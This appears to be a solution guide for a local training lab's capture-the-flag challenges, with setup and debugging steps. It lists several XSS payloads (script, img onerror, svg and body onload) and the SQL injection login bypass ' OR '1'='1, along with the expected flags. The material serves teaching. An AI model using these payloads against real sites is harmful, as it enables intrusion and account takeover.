# 🎯 XSS Challenge - How to Solve and Submit

## XSS Flag Information
- **Flag**: `FLAG{XSS_EXECUTED}`
- **Location**: Hidden in the page, revealed when XSS is triggered
- **Method**: Inject JavaScript to make the flag visible

---

## Step-by-Step Solution

### 1. Access the XSS Lab
Open your XSS machine in the browser (e.g., http://localhost:8001)

### 2. Exploit the XSS Vulnerability
In the comment field, enter this payload:
```html
<script>document.getElementById('xss-flag').style.display='block';</script>
```

Or use a simpler payload:
```html
<img src=x onerror="document.getElementById('xss-flag').style.display='block';">
```

### 3. Submit the Comment
Click "POST COMMENT"

### 4. See the Flag
After the page loads, you'll see a green box appear with:
```
✅ XSS Executed Successfully!
Congratulations! You exploited the XSS vulnerability!
FLAG{XSS_EXECUTED}
Copy this flag and submit it to earn points!
```

### 5. Copy the Flag
Copy: `FLAG{XSS_EXECUTED}`

### 6. Submit in the UI
Go to the "Flags" tab in the machine solver and paste the flag.

---

## Alternative Payloads

If the first payload doesn't work, try these:

### Alert-based:
```html
<script>alert(document.getElementById('xss-flag').textContent)</script>
```

### SVG-based:
```html
<svg onload="document.getElementById('xss-flag').style.display='block';">
```

### Body tag:
```html
<body onload="document.getElementById('xss-flag').style.display='block';">
```

---

## Checking if XSS Worked

Open browser console (F12) and you should see:
```
✅ XSS executed successfully!
Flag: FLAG{XSS_EXECUTED}
```

---

## All Available Flags (After Server Restart)

After creating NEW machines with the updated code:

### SQL Injection
- **Flag**: `FLAG{SQL_INJECTION_MASTER}`
- **How to get**: Use `' OR '1'='1` in login form
- **Where**: Displayed on success page after bypassing auth

### XSS
- **Flag**: `FLAG{XSS_EXECUTED}`
- **How to get**: Inject script to show hidden div
- **Where**: Hidden in page, revealed by your XSS payload

---

## Debugging

### Check Backend Logs
When you create a machine, you should see:
```
🔍 Creating vulnerability for sql_injection:
   Instance ID: xxx-sql_injection-0-yyy
   Flag from metadata: FLAG{SQL_INJECTION_MASTER}

🔍 Creating vulnerability for xss:
   Instance ID: xxx-xss-1-yyy
   Flag from metadata: FLAG{XSS_EXECUTED}
```

### Check Database
```bash
node diagnose.js
```

Should show:
```
Flag: FLAG{SQL_INJECTION_MASTER}
Flag: FLAG{XSS_EXECUTED}
```

NOT:
```
Flag: FLAG{SQL_INJECTION_ABC123...} ❌
```

---

## If Flags Still Don't Match

1. **Restart server** (if not already done):
   ```bash
   pkill -f "node server/index.js"
   cd /Users/ashwingajbhiye/Desktop/CyberForge/CyberForge
   npm run server
   ```

2. **Delete old machines** from the UI

3. **Create NEW machines** (old ones still have unique flags in DB)

4. **Check logs** - Both backend and browser console

5. **Verify metadata.json** has correct flags:
   ```bash
   cat modules/web/sql_injection/metadata.json | grep flag
   cat modules/web/xss/metadata.json | grep flag
   ```

---

## Expected Flow

### Creating Machine:
```
Backend logs:
🔍 Creating vulnerability for sql_injection:
   Flag from metadata: FLAG{SQL_INJECTION_MASTER}
🔍 Creating vulnerability for xss:
   Flag from metadata: FLAG{XSS_EXECUTED}
```

### Exploiting XSS:
```
1. Enter XSS payload in comment form
2. Click submit
3. Green box appears with flag
4. Copy FLAG{XSS_EXECUTED}
```

### Submitting Flag:
```
Browser console:
🚀 Submitting flag:
   Flag: FLAG{XSS_EXECUTED}

Backend logs:
🔍 Flag Verification Request:
   Submitted Flag: FLAG{XSS_EXECUTED}
   Expected Flag: FLAG{XSS_EXECUTED}
   Flags Match: true
✅ Flag is correct! Awarding points...
```

---

## Summary

**SQL Injection**: `FLAG{SQL_INJECTION_MASTER}`
- Exploit: `' OR '1'='1`
- Flag shown: On login success page

**XSS**: `FLAG{XSS_EXECUTED}`
- Exploit: `<script>document.getElementById('xss-flag').style.display='block';</script>`
- Flag shown: After XSS triggers and reveals hidden div

Both flags are now **hardcoded from metadata.json** and will work after server restart + new machine creation!
